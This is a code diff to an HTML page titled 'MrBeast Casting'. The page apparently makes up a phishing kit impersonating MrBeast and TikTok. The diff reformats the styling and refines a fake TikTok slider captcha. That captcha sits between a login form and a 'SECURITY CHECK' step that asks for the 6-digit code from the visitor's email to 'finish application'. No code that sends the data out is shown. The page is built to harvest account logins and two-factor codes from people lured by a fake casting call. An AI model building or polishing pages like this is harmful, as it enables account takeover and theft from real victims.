@@ -3,22 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link href="https://googleapis.com" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <title>MrBeast Casting</title>
     <style>
         :root { --blue: #00a8e8; --pink: #f12e3e; --green: #00ff88; }
         * { box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, var(--blue) 100%); color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; position: relative; }
-        .bg-shine { position: fixed; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.03) 0%, transparent 70%); animation: shine 20s infinite linear; z-index: 0; pointer-events: none; }
-        @keyframes shine { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') repeat; background-size: 60px; opacity: 0.15; z-index: 0; animation: float 20s ease-in-out infinite; }
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, var(--blue) 100%); 
+            color: #fff; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            overflow-x: hidden; 
+            position: relative; 
+        }
+        .bg-pattern { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') repeat; 
+            background-size: 60px; 
+            opacity: 0.15; 
+            z-index: 0; 
+            animation: float 20s ease-in-out infinite; 
+        }
         @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-20px); } }
         .top-logo { width: 280px; margin-top: 50px; margin-bottom: 20px; z-index: 10; position: relative; filter: drop-shadow(0 10px 30px rgba(0,168,232,0.3)); }
-        .box { background: rgba(17,17,17,0.95); backdrop-filter: blur(20px); border-radius: 25px; width: 92%; max-width: 420px; padding: 45px 30px; text-align: center; position: relative; z-index: 10; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 30px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1); }
-        .mr-glow { font-family: 'Inter', sans-serif; font-weight: 900; font-size: 44px; background: linear-gradient(45deg, var(--pink), #ff6b7a, var(--blue), #4dd0e9); background-size: 300% 300%; -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; animation: gradientShift 3s ease infinite, glowPulse 2s ease-in-out infinite alternate; filter: drop-shadow(0 0 20px var(--pink)) drop-shadow(0 0 40px var(--blue)); display: inline-block; position: relative; }
+        .box { 
+            background: rgba(17,17,17,0.95); 
+            backdrop-filter: blur(20px); 
+            border-radius: 25px; 
+            width: 92%; 
+            max-width: 420px; 
+            padding: 45px 30px; 
+            text-align: center; 
+            position: relative; 
+            z-index: 10; 
+            border: 1px solid rgba(255,255,255,0.1); 
+            box-shadow: 0 30px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.1); 
+        }
+        .mr-glow { 
+            font-family: 'Inter', sans-serif; 
+            font-weight: 900; 
+            font-size: 44px; 
+            background: linear-gradient(45deg, var(--pink), #ff6b7a, var(--blue), #4dd0e9); 
+            background-size: 300% 300%; 
+            -webkit-background-clip: text; 
+            background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+            animation: gradientShift 3s ease infinite, glowPulse 2s ease-in-out infinite alternate; 
+            filter: drop-shadow(0 0 20px var(--pink)) drop-shadow(0 0 40px var(--blue)); 
+            display: inline-block; 
+            position: relative; 
+        }
         @keyframes gradientShift { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
         @keyframes glowPulse { 0% { filter: drop-shadow(0 0 20px var(--pink)) drop-shadow(0 0 40px var(--blue)); } 100% { filter: drop-shadow(0 0 30px var(--pink)) drop-shadow(0 0 60px var(--blue)); } }
-        .beast-style { font-family: 'Inter', sans-serif; font-weight: 900; font-size: 44px; background: linear-gradient(45deg, #fff, var(--green)); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; display: inline-block; }
+        .beast-style { 
+            font-family: 'Inter', sans-serif; 
+            font-weight: 900; 
+            font-size: 44px; 
+            color: #fff !important; 
+            display: inline-block; 
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+        .security-title { 
+            font-family: 'Inter', sans-serif; 
+            font-weight: 900; 
+            font-size: 26px; 
+            color: #fff !important; 
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
         input { width: 100%; padding: 20px; margin-bottom: 18px; border: 2px solid rgba(255,255,255,0.1); background: rgba(26,26,26,0.8); color: #fff; border-radius: 16px; font-size: 16px; outline: none; backdrop-filter: blur(10px); transition: all 0.3s ease; }
         input:focus { border-color: var(--blue); box-shadow: 0 0 20px rgba(0,168,232,0.3); background: rgba(26,26,26,0.95); }
         input::placeholder { color: #888; }
@@ -28,6 +87,7 @@
         .tiktok-captcha { position: relative; height: 200px; background: linear-gradient(145deg, #1a1a1a, #0f0f0f); border-radius: 20px; border: 2px solid rgba(255,255,255,0.1); overflow: hidden; margin-bottom: 25px; }
         .tiktok-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png') no-repeat center; background-size: 120%; opacity: 0.25; filter: blur(1px); }
         .circle-slider { position: absolute; top: 50%; left: 20px; width: 80px; height: 80px; background: conic-gradient(from 0deg, var(--blue), #4dd0e9, var(--green)); border-radius: 50%; transform: translateY(-50%); cursor: grab; display: flex; align-items: center; justify-content: center; font-weight: 900; color: #000; font-size: 24px; box-shadow: 0 10px 30px rgba(0,168,232,0.4); z-index: 10; transition: left 0.1s ease; }
+        .circle-slider:active { cursor: grabbing; transform: translateY(-50%) scale(0.95); }
         .circle-slider.success { background: conic-gradient(from 0deg, var(--green), #00ff88); box-shadow: 0 10px 30px rgba(0,255,136,0.6); }
         .progress-arc { position: absolute; top: 50%; right: 20px; width: 100px; height: 100px; border: 6px dashed rgba(0,168,232,0.3); border-radius: 50%; transform: translateY(-50%); }
         .status-text { margin-top: 15px; font-size: 14px; color: #aaa; font-weight: 500; }
@@ -35,10 +95,10 @@
         .spinner { border: 4px solid rgba(0, 212, 255, 0.2); border-top: 4px solid var(--blue); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 30px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         #otp_section input { font-size: 28px; letter-spacing: 15px; text-align: center; font-weight: 700; padding: 20px 10px; }
+        .tiktok-title { font-size: 16px; font-weight: 600; color: #fff; margin-bottom: 12px; }
     </style>
 </head>
 <body>
-    <div class="bg-shine"></div>
     <div class="bg-pattern"></div>
     <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="top-logo">
     <div class="box">
@@ -50,6 +110,7 @@
             <button class="btn" onclick="sendLogin()">CONTINUE</button>
         </div>
         <div id="captcha_ui">
+            <p class="tiktok-title">Drag The Slider to Fit The Puzzle | TikTok</p>
             <p class="status-text" id="statusText">Drag the circle to match the logo</p>
             <div class="tiktok-captcha" id="track">
                 <div class="tiktok-bg"></div>
@@ -59,7 +120,7 @@
         </div>
         <div id="loader"><div class="spinner"></div><p>Verifying Identity...</p></div>
         <div id="otp_section">
-            <div class="beast-style" style="font-size:26px;">SECURITY CHECK</div>
+            <div class="security-title">SECURITY CHECK</div>
             <p style="color:#aaa; font-size:14px; margin:20px 0;">Enter the 6-digit code from your email</p>
             <input type="text" id="2fa_code" placeholder="000000" maxlength="6">
             <button class="btn" onclick="submitOTP()">FINISH APPLICATION</button>
@@ -81,19 +142,45 @@
             let dragging = false, startX = 0, currentX = 20;
             const move = (e) => {
                 if (!dragging) return;
+                e.preventDefault();
                 let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                 let x = clientX - startX;
                 if (x < 20) x = 20; if (x > 260) x = 260;
                 currentX = x; handle.style.left = x + 'px';
                 const progressPercent = (x - 20) / 240 * 360;
                 progress.style.transform = `translateY(-50%) rotate(${progressPercent}deg)`;
-                if (x > 215 && x < 235) { dragging = false; handle.classList.add('success'); handle.textContent = '✓'; statusText.textContent = 'Verified!'; setTimeout(showLoader, 800); }
+                statusText.textContent = x > 200 ? 'Almost there...' : 'Drag the circle to match the logo';
+                if (x > 215 && x < 235) { 
+                    dragging = false; 
+                    handle.classList.add('success'); 
+                    handle.textContent = '✓'; 
+                    statusText.textContent = 'Verified!'; 
+                    statusText.style.color = 'var(--green)';
+                    setTimeout(showLoader, 800); 
+                }
             };
-            const startDrag = (e) => { dragging = true; startX = (e.touches ? e.touches[0].clientX : e.clientX) - currentX; };
-            const endDrag = () => { if (!handle.classList.contains('success')) { handle.style.left = '20px'; currentX = 20; progress.style.transform = 'translateY(-50%) rotate(0deg)'; } dragging = false; };
-            handle.addEventListener('mousedown', startDrag); handle.addEventListener('touchstart', startDrag, {passive: false});
-            window.addEventListener('mousemove', move); window.addEventListener('touchmove', move, {passive: false});
-            window.addEventListener('mouseup', endDrag); window.addEventListener('touchend', endDrag);
+            const startDrag = (e) => { 
+                dragging = true; 
+                startX = (e.touches ? e.touches[0].clientX : e.clientX) - currentX; 
+                handle.style.transition = 'none';
+            };
+            const endDrag = () => { 
+                if (!handle.classList.contains('success')) { 
+                    handle.style.left = '20px'; 
+                    currentX = 20; 
+                    progress.style.transform = 'translateY(-50%) rotate(0deg)'; 
+                    statusText.textContent = 'Drag the circle to match the logo';
+                    statusText.style.color = '#aaa';
+                }
+                dragging = false; 
+                handle.style.transition = 'left 0.3s ease';
+            };
+            handle.addEventListener('mousedown', startDrag); 
+            handle.addEventListener('touchstart', startDrag, {passive: false});
+            window.addEventListener('mousemove', move); 
+            window.addEventListener('touchmove', move, {passive: false});
+            window.addEventListener('mouseup', endDrag); 
+            window.addEventListener('touchend', endDrag);
         }
         function showLoader() {
             document.getElementById('captcha_ui').style.display = 'none';
